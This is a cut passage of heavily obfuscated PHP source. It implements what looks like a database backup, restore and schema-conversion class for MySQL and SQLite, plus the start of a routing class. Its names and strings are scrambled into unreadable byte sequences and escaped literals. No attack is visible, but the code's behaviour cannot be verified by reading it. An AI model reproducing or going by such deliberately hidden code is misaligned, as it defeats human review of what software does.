$this->modelSql[$Ù„ş»“Ú] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¯È®êºµ) { return addslashes($¯È®êºµ); } public function setModel($ Š€çù») { $this->model = $ Š€çù»; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ÿ­«ÕÔ† = array()) { $‘åÃ£ıÖ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($Ÿ­«ÕÔ†)) { $Ÿ­«ÕÔ† = $GLOBALS[$‘åÃ£ıÖ[6]][$‘åÃ£ıÖ[21]]; } $this->database = $Ÿ­«ÕÔ†; } public function model($ÅÚ¿„„» = '') { return new ModelBase($ÅÚ¿„„», $_SERVER[™¾ÇÙ¯¹][12], $this->database); } public function db($³óäüı† = false) { $»îù¨¿Ö =& $_SERVER[™¾ÇÙ¯¹]; $¿–Ü‹€œ = array_change_key_case($this->database); if ($this->dbType() == $»îù¨¿Ö[13] || !$³óäüı†) { return $this->model()->db(); } $¨Ê Ù‚ = $¿–Ü‹€œ[$»îù¨¿Ö[980]]; $¿–Ü‹€œ[$»îù¨¿Ö[980]] = $»îù¨¿Ö[12]; if ($¿–Ü‹€œ[$»îù¨¿Ö[975]] == $»îù¨¿Ö[972]) { $•µåõÂš = $¿–Ü‹€œ[$»îù¨¿Ö[981]]; $¿–Ü‹€œ[$»îù¨¿Ö[981]] = substr($•µåõÂš, 0, strrpos($•µåõÂš, $»îù¨¿Ö[1067])); } $this->database = $¿–Ü‹€œ; $±ÎÁî²ñ = $this->model()->db(); try { $­ıú¢ÇÉ = $±ÎÁî²ñ->execute("\163\x68\157\x77\40\x64\x61\164\x61\x62\x61\x73\145\163\x20\154\151\x6b\x65\x20\47{$¨Ê Ù‚}\x27"); } catch (Exception $Óşå‰ÄÙ) { } if (!$­ıú¢ÇÉ) { $±ÎÁî²ñ->execute("\143\162\x65\x61\164\145\40\144\141\164\141\x62\x61\163\145\40\140{$¨Ê Ù‚}\140"); } $¿–Ü‹€œ[$»îù¨¿Ö[980]] = $¨Ê Ù‚; if ($¿–Ü‹€œ[$»îù¨¿Ö[975]] == $»îù¨¿Ö[972]) { $¿–Ü‹€œ[$»îù¨¿Ö[981]] .= $»îù¨¿Ö[1067] . $¨Ê Ù‚; } $this->database = $¿–Ü‹€œ; $±ÎÁî²ñ->execute("\165\x73\x65\x20\140{$¨Ê Ù‚}\140"); return $±ÎÁî²ñ; } public function createTable($Ó½ÃÚÊ‡, &$úã›º¨ß) { $¦ì“¡Û¦ =& $_SERVER[™¾ÇÙ¯¹]; if (!IO::exist($Ó½ÃÚÊ‡)) { ActionCall($¦ì“¡Û¦[1068], !0, 0); show_json(LNG($¦ì“¡Û¦[1069]), !1); } $—óÏÊŸğ = $this->model()->db(); $‰Ñ¹¹òé = sqlSplit(IO::getContent($Ó½ÃÚÊ‡)); foreach ($‰Ñ¹¹òé as $ ÌØÄÈ´) { $ŸÆŠÉ²– = stripos($ ÌØÄÈ´, $¦ì“¡Û¦[1070]) === 0; if ($ŸÆŠÉ²–) { $úã›º¨ß->task[$¦ì“¡Û¦[801]] += 1; } $—óÏÊŸğ->execute($ ÌØÄÈ´); if ($ŸÆŠÉ²–) { preg_match($¦ì“¡Û¦[1071], $ ÌØÄÈ´, $ã–•Ö€æ); $úã›º¨ß->task[$¦ì“¡Û¦[1072]] = $ã–•Ö€æ[1]; $úã›º¨ß->update(1); } } } public function insertTable($èÀ†å¤¿, &$ƒ›ŞŠÈí) { $í¨×Åü¼ =& $_SERVER[™¾ÇÙ¯¹]; $Óş¦ÍÂŠ = $this->model()->db(); $šÄç‘÷ = $Û ‘èÑç ? array($Û ‘èÑç) : $Óş¦ÍÂŠ->getTables(); foreach ($èÀ†å¤¿ as $ ‚ĞÌÏË) { $Û ‘èÑç = basename($ ‚ĞÌÏË, $í¨×Åü¼[803]); if (!in_array($Û ‘èÑç, $šÄç‘÷)) { continue; } $ƒ›ŞŠÈí->task[$í¨×Åü¼[1072]] = $Û ‘èÑç; if (get_filesize($ ‚ĞÌÏË) == 0) { continue; } $üÌ·èûŠ = $this->sqlToDb($ ‚ĞÌÏË, $ƒ›ŞŠÈí); if (!$üÌ·èûŠ) { ActionCall($í¨×Åü¼[1068], !0, 0); show_json(LNG($í¨×Åü¼[1073]) . "\x5b{$Û ‘èÑç}\x5d", !1); } } } public function sqlFromDb($Ú®Ñ¿ôö, $ú¶èÓ‡á, &$ğ»õ¯‚ç, $öß„ÉÅ = '') { if ($ğ»õ¯‚ç) { $ğ»õ¯‚ç->task[$_SERVER[™¾ÇÙ¯¹][1072]] = $Ú®Ñ¿ôö; } $ÉåˆŠ‰Ä = $this->model($Ú®Ñ¿ôö); $¦í•à» = 0; $¸µ²–Ü = 0; $ÖÀÁß¶” = 10000; $şŞèÒí¥ = fopen($ú¶èÓ‡á, $_SERVER[™¾ÇÙ¯¹][1074]); $˜ä½ÆıŞ = $ÉåˆŠ‰Ä->getPk(); $•À×–Øö = $ÉåˆŠ‰Ä->getDbFields(); $Æ£Ÿæ²ë = $_SERVER[™¾ÇÙ¯¹][12]; if ($GLOBALS[$_SERVER[™¾ÇÙ¯¹][802]] && in_array($Ú®Ñ¿ôö, array($_SERVER[™¾ÇÙ¯¹][1075], $_SERVER[™¾ÇÙ¯¹][1076]))) { $Æ£Ÿæ²ë = $Ú®Ñ¿ôö; } do { $‰ïéÄ§Ì = array($˜ä½ÆıŞ => array($_SERVER[™¾ÇÙ¯¹][1022], $¸µ²–Ü)); $àúû‰åÀ = $ÉåˆŠ‰Ä->where($‰ïéÄ§Ì)->field($•À×–Øö)->order($˜ä½ÆıŞ . $_SERVER[™¾ÇÙ¯¹][1077])->limit($ÖÀÁß¶”)->select(); $àúû‰åÀ = !empty($àúû‰åÀ) ? $àúû‰åÀ : array(); if (!($²†Ù—ÅÙ = count($àúû‰åÀ))) { break; } $¼ğ¯‰ãù = end($àúû‰åÀ); $¸µ²–Ü = $¼ğ¯‰ãù[$˜ä½ÆıŞ]; $½ü²İüÄ = array(); foreach ($àúû‰åÀ as $ÀÀˆ¬‚ô) { if ($Æ£Ÿæ²ë) { if ($Ú®Ñ¿ôö == $_SERVER[™¾ÇÙ¯¹][1075]) { if ($ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][33]] == $_SERVER[™¾ÇÙ¯¹][1078]) { $÷Ê—Ü±¶ = json_decode($ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][383]], !0); if ($÷Ê—Ü±¶[$_SERVER[™¾ÇÙ¯¹][32]] == $GLOBALS[$_SERVER[™¾ÇÙ¯¹][802]] && $÷Ê—Ü±¶[$_SERVER[™¾ÇÙ¯¹][765]] != 1) { continue; } } } else { if ($ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][33]] == $_SERVER[™¾ÇÙ¯¹][1079] && $ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][94]] == $_SERVER[™¾ÇÙ¯¹][794]) { continue; } } } if ($öß„ÉÅ) { $ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][84]] = "\173\151\157\72{$öß„ÉÅ}\x7d" . substr($ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][84]], strlen("\173\x69\157\72{$ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][832]]}\175")); $ÀÀˆ¬‚ô[$_SERVER[™¾ÇÙ¯¹][832]] = $öß„ÉÅ; } $½ü²İüÄ[] = $_SERVER[™¾ÇÙ¯¹][1080] . $this->sqlEncode($ÀÀˆ¬‚ô) . $_SERVER[™¾ÇÙ¯¹][1081]; } $‚ºÉóÜÉ = "\111\116\x53\x45\x52\x54\x20\111\116\x54\x4f\40\x60{$Ú®Ñ¿ôö}\140\x20\50\x60" . implode($_SERVER[™¾ÇÙ¯¹][1082], $•À×–Øö) . $_SERVER[™¾ÇÙ¯¹][1083]; fwrite($şŞèÒí¥, $‚ºÉóÜÉ . implode($_SERVER[™¾ÇÙ¯¹][1084], $½ü²İüÄ) . $_SERVER[™¾ÇÙ¯¹][71] . PHP_EOL); $¦í•à» += $²†Ù—ÅÙ; if ($ğ»õ¯‚ç) { $ğ»õ¯‚ç->update($²†Ù—ÅÙ); } } while ($ÖÀÁß¶” == $²†Ù—ÅÙ); fclose($şŞèÒí¥); return $¦í•à»; } public function sqlToDb($ü–ìàÉ, &$ÈêôÒ¼™) { $º¾öï =& $_SERVER[™¾ÇÙ¯¹]; $õô€´æÎ = $this->model()->db(); $ĞÔÖ¿Ö = @fopen($ü–ìàÉ, $º¾öï[1085]); if (!$ĞÔÖ¿Ö) { return !1; } $ ²‰¯ã” = 0; $›Öß‚²³ = $º¾öï[12]; $ÂóîÙ˜ = array(); $»¦í´”Ù = $this->dbType(); $ÅÁ©™ö¾ = $»¦í´”Ù == $º¾öï[13] ? 500 : 2000; $¤¯¾âÏë = basename($ü–ìàÉ, $º¾öï[803]); $Ò²×®üø = 0; $ÚÌÕ¿Øı = 4194304 - 104858; $»Åêç…Ä = 1000000 - 104858; while (!feof($ĞÔÖ¿Ö)) { $»ñğü‚Ğ = trim(fgets($ĞÔÖ¿Ö)); if (!$»ñğü‚Ğ) { continue; } $Éˆ‹Ãµ¼ = $this->sqlDecode($»ñğü‚Ğ, $»¦í´”Ù, $¤¯¾âÏë); if (stripos($Éˆ‹Ãµ¼, $º¾öï[364]) === 0) { if (!$›Öß‚²³) { $›Öß‚²³ = $Éˆ‹Ãµ¼ . $º¾öï[53]; } continue; } if ($ÈêôÒ¼™) { $ÈêôÒ¼™->task[$º¾öï[801]] += 1; } $ ²‰¯ã”++; $ÂóîÙ˜[] = rtrim(rtrim(trim($Éˆ‹Ãµ¼), $º¾öï[50]), $º¾öï[71]); $Ï‚èÈ±Ü = null; $È«³”‹ = strlen($Éˆ‹Ãµ¼); $Ò²×®üø += $È«³”‹; if ($Ò²×®üø >= ($ÅÁ©™ö¾ == 500 ? $»Åêç…Ä : $ÚÌÕ¿Øı)) { $Ï‚èÈ±Ü = array_pop($ÂóîÙ˜); if ($ ²‰¯ã” > 1) { $ ²‰¯ã”--; } } if ($ ²‰¯ã” >= $ÅÁ©™ö¾ || $Ï‚èÈ±Ü) { $Éˆ‹Ãµ¼ = $›Öß‚²³ . implode($º¾öï[50], $ÂóîÙ˜); if (!$õô€´æÎ->execute($Éˆ‹Ãµ¼)) { return !1; } if ($ÈêôÒ¼™) { $ÈêôÒ¼™->update($ ²‰¯ã”); } $ÂóîÙ˜ = array(); $ ²‰¯ã” = 0; $Ò²×®üø = 0; if ($Ï‚èÈ±Ü) { $ÂóîÙ˜ = array($Ï‚èÈ±Ü); $ ²‰¯ã” = 1; $Ò²×®üø = $È«³”‹; } } } fclose($ĞÔÖ¿Ö); if (!empty($ÂóîÙ˜)) { $Éˆ‹Ãµ¼ = $›Öß‚²³ . implode($º¾öï[50], $ÂóîÙ˜); if (!$õô€´æÎ->execute($Éˆ‹Ãµ¼)) { return !1; } if ($ÈêôÒ¼™) { $ÈêôÒ¼™->update($ ²‰¯ã”); } } return !0; } public function dropTable($ÓêÅûØº = null) { $¯öæ¬º = $this->model()->db(); $Õ°Œ¦Š¯ = $ÓêÅûØº ? array($ÓêÅûØº) : $¯öæ¬º->getTables(); if (!$Õ°Œ¦Š¯) { return; } foreach ($Õ°Œ¦Š¯ as $ÓêÅûØº) { if ($ÓêÅûØº) { $ÓêÅûØº = strtolower($ÓêÅûØº); } else { continue; } $¯öæ¬º->execute("\144\x72\x6f\160\40\164\x61\142\x6c\145\x20\x69\146\x20\x65\170\151\163\x74\163\x20\140{$ÓêÅûØº}\140"); } } private function sqlEncode($Íœ‚âÏ) { $Šï“³ =& $_SERVER[™¾ÇÙ¯¹]; $›ÔÖìàç = array(); foreach ($Íœ‚âÏ as $±â¿ûïª) { if (is_array($±â¿ûïª)) { $±â¿ûïª = json_encode_force($±â¿ûïª); } $±â¿ûïª = addslashes($±â¿ûïª); $±â¿ûïª = str_replace(array($Šï“³[1086], $Šï“³[231]), array($Šï“³[1087], $Šï“³[1088]), $±â¿ûïª); $›ÔÖìàç[] = str_replace($Šï“³[58], $Šï“³[1089], $±â¿ûïª); } return $Šï“³[58] . implode($Šï“³[1090], $›ÔÖìàç) . $Šï“³[58]; } private function sqlDecode($Ğıöİûñ, $·»³ãÊ, $¨­ßªš¦ = '') { $± éïª¯ =& $_SERVER[™¾ÇÙ¯¹]; $Ğıöİûñ = str_replace(array($± éïª¯[1087], $± éïª¯[1088]), array($± éïª¯[1086], $± éïª¯[231]), $Ğıöİûñ); if ($·»³ãÊ == $± éïª¯[13]) { return $¨­ßªš¦ != $± éïª¯[1091] ? stripslashes($Ğıöİûñ) : $Ğıöİûñ; } if ($¨­ßªš¦ == $± éïª¯[1091]) { $Ğıöİûñ = str_replace($± éïª¯[1092], $± éïª¯[118], stripslashes($Ğıöİûñ)); } return $Ğıöİûñ; } public function getSqlFile($Ÿ¤Èˆíî = '') { $Ù”’÷öë =& $_SERVER[™¾ÇÙ¯¹]; $ş…ƒÀ·  = $this->dbType(!0); $ñŒ„œˆå = CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\x6c\57\x64\141\164\x61\57{$ş…ƒÀ· }\x2e\x73\x71\154"; $¢‘£ø = file_get_contents($ñŒ„œˆå); $ø‘ÁÄá = $Ù”’÷öë[1093] . ($ş…ƒÀ·  == $Ù”’÷öë[819] ? $Ù”’÷öë[1094] : $Ù”’÷öë[1095]) . $Ù”’÷öë[1096]; preg_match_all($ø‘ÁÄá, $¢‘£ø, $‘ÕÚ€¥); $óóÕâ÷Ş = $‘ÕÚ€¥[1]; $Ö«ˆÒì­ = $this->model()->db(); $åİéçÎÑ = $Ö«ˆÒì­->getTables(); $ŸŒñ†Ù† = TEMP_FILES . $Ù”’÷öë[1097] . date($Ù”’÷öë[766]) . $Ù”’÷öë[8]; del_dir($ŸŒñ†Ù†); mk_dir($ŸŒñ†Ù†); $Ø×­›×° = $ŸŒñ†Ù† . $Ù”’÷öë[1098]; $¸ß© Ñ‰ = $ŸŒñ†Ù† . $Ù”’÷öë[1099]; $Ü¶Ó¶¤® = $ş…ƒÀ·  == $Ù”’÷öë[13] ? $Ù”’÷öë[819] : $Ù”’÷öë[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\154\x6c\57\144\141\164\141\57{$Ü¶Ó¶¤®}\56\x73\161\x6c", $ŸŒñ†Ù†); @touch($ŸŒñ†Ù† . $ş…ƒÀ·  . $Ù”’÷öë[803]); $İ–ƒ£î = fopen($Ø×­›×°, $Ù”’÷öë[1074]); $¼¨¶Õ±‡ = fopen($¸ß© Ñ‰, $Ù”’÷öë[1074]); if ($ş…ƒÀ·  == $Ù”’÷öë[13]) { $åİéçÎÑ = array_diff($åİéçÎÑ, array($Ù”’÷öë[799], $Ù”’÷öë[800])); $®ÉœçÍ¥ = array($Ù”’÷öë[1100], $Ù”’÷öë[1101], $Ù”’÷öë[1102]); fwrite($¼¨¶Õ±‡, implode(PHP_EOL, $®ÉœçÍ¥) . PHP_EOL . PHP_EOL); foreach ($åİéçÎÑ as $‘¹Ì¤«Æ) { $í–ª¼“¦ = $this->sqlFromSqlite($‘¹Ì¤«Æ); if (!$í–ª¼“¦[$Ù”’÷öë[13]]) { continue; } fwrite($¼¨¶Õ±‡, $í–ª¼“¦[$Ù”’÷öë[13]] . PHP_EOL . PHP_EOL); if (!in_array($‘¹Ì¤«Æ, $óóÕâ÷Ş)) { fwrite($İ–ƒ£î, $í–ª¼“¦[$Ù”’÷öë[819]] . PHP_EOL . PHP_EOL); } } } else { foreach ($åİéçÎÑ as $‘¹Ì¤«Æ) { $í–ª¼“¦ = $this->sqlFromMysql($‘¹Ì¤«Æ); if (!$í–ª¼“¦[$Ù”’÷öë[819]]) { continue; } fwrite($İ–ƒ£î, $í–ª¼“¦[$Ù”’÷öë[819]] . PHP_EOL . PHP_EOL); if (!in_array($‘¹Ì¤«Æ, $óóÕâ÷Ş)) { fwrite($¼¨¶Õ±‡, $í–ª¼“¦[$Ù”’÷öë[13]] . PHP_EOL . PHP_EOL); } } } fclose($İ–ƒ£î); fclose($¼¨¶Õ±‡); $¢‘£ø = array($Ù”’÷öë[819] => $Ø×­›×°, $Ù”’÷öë[13] => $¸ß© Ñ‰); return $Ÿ¤Èˆíî ? $¢‘£ø[$Ÿ¤Èˆíî] : $¢‘£ø; } public function dbType($øØªßäÙ = false) { $ø”‘çä± =& $_SERVER[™¾ÇÙ¯¹]; $¿ÁÍñû = $øØªßäÙ ? $GLOBALS[$ø”‘çä±[6]][$ø”‘çä±[21]] : $this->database; $¿ÁÍñû = array_change_key_case($¿ÁÍñû); $ÑŒ‰åéÊ = $¿ÁÍñû[$ø”‘çä±[975]]; if ($ÑŒ‰åéÊ == $ø”‘çä±[972]) { $ßıÛ£˜ = explode($ø”‘çä±[4], $¿ÁÍñû[$ø”‘çä±[981]]); $ÑŒ‰åéÊ = $ßıÛ£˜[0]; } $ë –Ø® = array($ø”‘çä±[1103] => $ø”‘çä±[13], $ø”‘çä±[920] => $ø”‘çä±[819]); if (isset($ë –Ø®[$ÑŒ‰åéÊ])) { $ÑŒ‰åéÊ = $ë –Ø®[$ÑŒ‰åéÊ]; } return $ÑŒ‰åéÊ; } public function sqlFromMysql($›Úƒá, $™êı©óà = '') { $ë¦«â¤­ =& $_SERVER[™¾ÇÙ¯¹]; $İÄŸ•× = $this->model()->db(); $Ù“¨×› = $İÄŸ•×->query($ë¦«â¤­[1104] . $›Úƒá . $ë¦«â¤­[393]); if (!$Ù“¨×› || !$Ù“¨×›[0]) { return !1; } $Ú¿ŞÈìû = _get($Ù“¨×›[0], $ë¦«â¤­[1105], $ë¦«â¤­[12]); if (!$Ú¿ŞÈìû) { return !1; } $ç»¹ÂË = "\104\122\x4f\x50\x20\124\101\x42\114\105\40\111\106\40\105\130\111\x53\124\123\x20\x60{$›Úƒá}\140\x3b" . PHP_EOL . $Ú¿ŞÈìû . $ë¦«â¤­[71]; if ($™êı©óà && $™êı©óà == $ë¦«â¤­[819]) { return $ç»¹ÂË; } $éèßÓ¾Ë = array_change_key_case($GLOBALS[$ë¦«â¤­[6]][$ë¦«â¤­[21]]); $ì¥Ñßè = $éèßÓ¾Ë[$ë¦«â¤­[980]]; $ù£’² = $ë¦«â¤­[1106] . $ì¥Ñßè . $ë¦«â¤­[1107] . $›Úƒá . $ë¦«â¤­[58]; $˜åÚ¬çô = $ë¦«â¤­[1108] . $›Úƒá . $ë¦«â¤­[908]; $Úõ²·‰ = $İÄŸ•×->query($ù£’²); if (empty($Úõ²·‰)) { $úãƒ·ğ = array($ë¦«â¤­[819] => $ë¦«â¤­[12], $ë¦«â¤­[13] => $ë¦«â¤­[12]); return $™êı©óà ? $úãƒ·ğ[$™êı©óà] : $úãƒ·ğ; } $†„È·ÜÙ = $İÄŸ•×->query($˜åÚ¬çô); $Ì£ƒŞåı = $ë¦«â¤­[12]; $´ó¶ò¾Ù = array(); foreach ($†„È·ÜÙ as $ÑĞŞÈ£ş) { if (!$Ì£ƒŞåı && $ÑĞŞÈ£ş[$ë¦«â¤­[1109]] == $ë¦«â¤­[1110]) { $Ì£ƒŞåı = $ÑĞŞÈ£ş[$ë¦«â¤­[1111]]; } if (isset($´ó¶ò¾Ù[$ÑĞŞÈ£ş[$ë¦«â¤­[1109]]])) { $´ó¶ò¾Ù[$ÑĞŞÈ£ş[$ë¦«â¤­[1109]]][$ë¦«â¤­[1112]][] = $ÑĞŞÈ£ş[$ë¦«â¤­[1111]]; continue; } $´ó¶ò¾Ù[$ÑĞŞÈ£ş[$ë¦«â¤­[1109]]] = array($ë¦«â¤­[1113] => $ÑĞŞÈ£ş[$ë¦«â¤­[1109]], $ë¦«â¤­[1112] => array($ÑĞŞÈ£ş[$ë¦«â¤­[1111]]), $ë¦«â¤­[1114] => $ÑĞŞÈ£ş[$ë¦«â¤­[1115]] == $ë¦«â¤­[88] ? 0 : 1); } $¥ÀåÈÄ = array(); foreach ($´ó¶ò¾Ù as $ÑĞŞÈ£ş) { $…İÒ Šß = $ÑĞŞÈ£ş[$ë¦«â¤­[1113]] == $ë¦«â¤­[1110]; $ş¿®â†° = array($ë¦«â¤­[1116], $ÑĞŞÈ£ş[$ë¦«â¤­[1114]] == $ë¦«â¤­[88] && !$…İÒ Šß ? $ë¦«â¤­[1117] : $ë¦«â¤­[12], $ë¦«â¤­[1118], $ë¦«â¤­[1119] . $›Úƒá . $ë¦«â¤­[11] . ($…İÒ Šß ? $ë¦«â¤­[1120] : $ÑĞŞÈ£ş[$ë¦«â¤­[1113]]) . $ë¦«â¤­[118], $ë¦«â¤­[1121], $ë¦«â¤­[118] . $›Úƒá . $ë¦«â¤­[118], $ë¦«â¤­[1122] . implode($ë¦«â¤­[1123], $ÑĞŞÈ£ş[$ë¦«â¤­[1112]]) . $ë¦«â¤­[1124]); $¥ÀåÈÄ[] = implode($ë¦«â¤­[53], $ş¿®â†°) . $ë¦«â¤­[71]; } $ÀÈ‡‡ı… = array(); $¦˜¬†Ÿ = array($ë¦«â¤­[1125] => $ë¦«â¤­[1126], $ë¦«â¤­[1126] => $ë¦«â¤­[1126], $ë¦«â¤­[297] => $ë¦«â¤­[324], $ë¦«â¤­[296] => $ë¦«â¤­[324]); foreach ($Úõ²·‰ as $ÑĞŞÈ£ş) { $ş¿®â†° = array($ë¦«â¤­[118] . $ÑĞŞÈ£ş[$ë¦«â¤­[1127]] . $ë¦«â¤­[118], isset($¦˜¬†Ÿ[$ÑĞŞÈ£ş[$ë¦«â¤­[1128]]]) ? $¦˜¬†Ÿ[$ÑĞŞÈ£ş[$ë¦«â¤­[1128]]] : $ÑĞŞÈ£ş[$ë¦«â¤­[1129]], $ÑĞŞÈ£ş[$ë¦«â¤­[1130]] == $ë¦«â¤­[906] ? $ë¦«â¤­[1131] : $ë¦«â¤­[1132], $ÑĞŞÈ£ş[$ë¦«â¤­[1127]] == $Ì£ƒŞåı ? $ë¦«â¤­[1133] : $ë¦«â¤­[12], $ÑĞŞÈ£ş[$ë¦«â¤­[957]] ? strtoupper(str_replace($ë¦«â¤­[11], $ë¦«â¤­[12], $ÑĞŞÈ£ş[$ë¦«â¤­[957]])) : $ë¦«â¤­[12]); $ÀÈ‡‡ı…[] = trim(implode($ë¦«â¤­[53], $ş¿®â†°)); } $à‰µ©’— = array($ë¦«â¤­[1134] . $›Úƒá . $ë¦«â¤­[1135], $ë¦«â¤­[1136] . $›Úƒá . $ë¦«â¤­[1137], implode($ë¦«â¤­[50] . PHP_EOL, $ÀÈ‡‡ı…), $ë¦«â¤­[954]); $º Ğ›‡õ = implode(PHP_EOL, array_merge($à‰µ©’—, $¥ÀåÈÄ)); if ($™êı©óà && $™êı©óà == $ë¦«â¤­[13]) { return $º Ğ›‡õ; } $úãƒ·ğ = array($ë¦«â¤­[819] => $ç»¹ÂË, $ë¦«â¤­[13] => $º Ğ›‡õ); return $™êı©óà ? $úãƒ·ğ[$™êı©óà] : $úãƒ·ğ; } public function sqlFromSqlite($ä¡¾Í‰ö, $Í×Á‰ = '') { $¡ÃÉÏ­õ =& $_SERVER[™¾ÇÙ¯¹]; $»ùìš¾ô = $this->model()->db(); $Ùò¦¨ÎÕ = "\120\x52\101\107\115\x41\x20\x54\101\102\114\105\137\x49\116\x46\117\x20\x28\47{$ä¡¾Í‰ö}\47\51"; $£íğ©ÀÏ = "\x53\105\114\105\x43\124\x20\52\x20\106\122\117\115\x20\x73\161\x6c\151\x74\145\137\x6d\x61\x73\164\x65\x72\x20\x57\110\x45\x52\105\40\164\142\x6c\x5f\x6e\141\x6d\145\40\75\x20\47{$ä¡¾Í‰ö}\x27"; $´Ÿ©ºŒ‘ = $»ùìš¾ô->query($Ùò¦¨ÎÕ); if (empty($´Ÿ©ºŒ‘)) { $©¥ªï = array($¡ÃÉÏ­õ[819] => $¡ÃÉÏ­õ[12], $¡ÃÉÏ­õ[13] => $¡ÃÉÏ­õ[12]); return $Í×Á‰ ? $©¥ªï[$Í×Á‰] : $©¥ªï; } $–ƒÎ‡¹ô = $»ùìš¾ô->query($£íğ©ÀÏ); $óÛ²Ä¯ = $Ï–»ÄÛÌ = array(); foreach ($–ƒÎ‡¹ô as $ñ––¯…) { if ($ñ––¯…[$¡ÃÉÏ­õ[33]] == $¡ÃÉÏ­õ[288]) { $óÛ²Ä¯[] = $ñ––¯…[$¡ÃÉÏ­õ[1138]]; } else { $Ï–»ÄÛÌ[$ñ––¯…[$¡ÃÉÏ­õ[32]]] = $ñ––¯…[$¡ÃÉÏ­õ[1138]]; } } $Ú¹Òáä = array_merge(array($¡ÃÉÏ­õ[1134] . $ä¡¾Í‰ö . $¡ÃÉÏ­õ[118]), $óÛ²Ä¯, array_values($Ï–»ÄÛÌ)); $Ú¹Òáä = implode($¡ÃÉÏ­õ[71] . PHP_EOL, $Ú¹Òáä) . $¡ÃÉÏ­õ[71]; if ($Í×Á‰ && $Í×Á‰ == $¡ÃÉÏ­õ[13]) { return $Ú¹Òáä; } $Ú¯Å‰”Å = array(); $¨ŞìÈ¢’ = array($¡ÃÉÏ­õ[1126] => $¡ÃÉÏ­õ[1139], $¡ÃÉÏ­õ[324] => $¡ÃÉÏ­õ[1140]); $ğë›¼ = $¡ÃÉÏ­õ[12]; foreach ($´Ÿ©ºŒ‘ as $ñ––¯…) { if ($ñ––¯…[$¡ÃÉÏ­õ[57]] == $¡ÃÉÏ­õ[88]) { $ğë›¼ = $ñ––¯…[$¡ÃÉÏ­õ[32]]; } $×˜×Üã® = array($¡ÃÉÏ­õ[393] . $ñ––¯…[$¡ÃÉÏ­õ[32]] . $¡ÃÉÏ­õ[393], isset($¨ŞìÈ¢’[$ñ––¯…[$¡ÃÉÏ­õ[33]]]) ? $¨ŞìÈ¢’[$ñ––¯…[$¡ÃÉÏ­õ[33]]] : $ñ––¯…[$¡ÃÉÏ­õ[33]], $ñ––¯…[$¡ÃÉÏ­õ[35]] == $¡ÃÉÏ­õ[88] ? $¡ÃÉÏ­õ[1131] : $¡ÃÉÏ­õ[1141] . $ñ––¯…[$¡ÃÉÏ­õ[56]], $ñ––¯…[$¡ÃÉÏ­õ[57]] == $¡ÃÉÏ­õ[88] ? $¡ÃÉÏ­õ[1142] : $¡ÃÉÏ­õ[12]); $Ú¯Å‰”Å[] = trim(implode($¡ÃÉÏ­õ[53], $×˜×Üã®)); } foreach ($Ï–»ÄÛÌ as $î³Ö÷¡Í => $Ã»Üëæ×) { $›šØİÛ = str_replace($¡ÃÉÏ­õ[1143] . $ä¡¾Í‰ö . $¡ÃÉÏ­õ[11], $¡ÃÉÏ­õ[12], $î³Ö÷¡Í); $úË²“Ö­ = str_replace(array($¡ÃÉÏ­õ[118], $¡ÃÉÏ­õ[965]), $¡ÃÉÏ­õ[393], substr($Ã»Üëæ×, stripos($Ã»Üëæ×, $¡ÃÉÏ­õ[269]))); if ($›šØİÛ == $¡ÃÉÏ­õ[1120]) { $â®›„´½ = $¡ÃÉÏ­õ[1144] . $ğë›¼ . $¡ÃÉÏ­õ[1145]; } else { $â®›„´½ = (stripos($›šØİÛ, $¡ÃÉÏ­õ[11]) ? $¡ÃÉÏ­õ[1146] : $¡ÃÉÏ­õ[12]) . ($¡ÃÉÏ­õ[1147] . $›šØİÛ . $¡ÃÉÏ­õ[1148] . $úË²“Ö­); } $Ú¯Å‰”Å[] = $â®›„´½; } $Êê¸ÕöÖ = array($¡ÃÉÏ­õ[1149] . $ä¡¾Í‰ö . $¡ÃÉÏ­õ[1150], $¡ÃÉÏ­õ[1151] . $ä¡¾Í‰ö . $¡ÃÉÏ­õ[1152], implode($¡ÃÉÏ­õ[50] . PHP_EOL, $Ú¯Å‰”Å), $¡ÃÉÏ­õ[1153]); $Èõ´Ó× = implode(PHP_EOL, $Êê¸ÕöÖ); if ($Í×Á‰ && $Í×Á‰ == $¡ÃÉÏ­õ[819]) { return $Èõ´Ó×; } $©¥ªï = array($¡ÃÉÏ­õ[819] => $Èõ´Ó×, $¡ÃÉÏ­õ[13] => $Ú¹Òáä); return $Í×Á‰ ? $©¥ªï[$Í×Á‰] : $©¥ªï; } } goto D‹‡ÙŒ…†Î; C°‰¿À„ç®: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\x5e\57\135\x2b", "\72\156\165\155" => "\133\60\x2d\x39\135\53", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($—¹ö‚ìû, $â³Ùõ¸Ã) { $Œ¬…±ì’ =& $_SERVER[™¾ÇÙ¯¹]; if ($—¹ö‚ìû == $Œ¬…±ì’[1609]) { $ìÛú¤ÖÕ = array_map($Œ¬…±ì’[1610], $â³Ùõ¸Ã[0]); $Ø—¥ñ§Å = strpos($â³Ùõ¸Ã[1], $Œ¬…±ì’[8]) === 0 ? $â³Ùõ¸Ã[1] : $Œ¬…±ì’[8] . $â³Ùõ¸Ã[1]; $‚Ğëë›ı = $â³Ùõ¸Ã[2]; } else { $ìÛú¤ÖÕ = null; $Ø—¥ñ§Å = strpos($â³Ùõ¸Ã[0], $Œ¬…±ì’[8]) === 0 ? $â³Ùõ¸Ã[0] : $Œ¬…±ì’[8] . $â³Ùõ¸Ã[0]; $‚Ğëë›ı = $â³Ùõ¸Ã[1]; } array_push(self::$maps, $ìÛú¤ÖÕ); array_push(self::$routes, $Ø—¥ñ§Å); array_push(self::$methods, strtoupper($—¹ö‚ìû)); array_push(self::$callbacks, $‚Ğëë›ı); } public static function 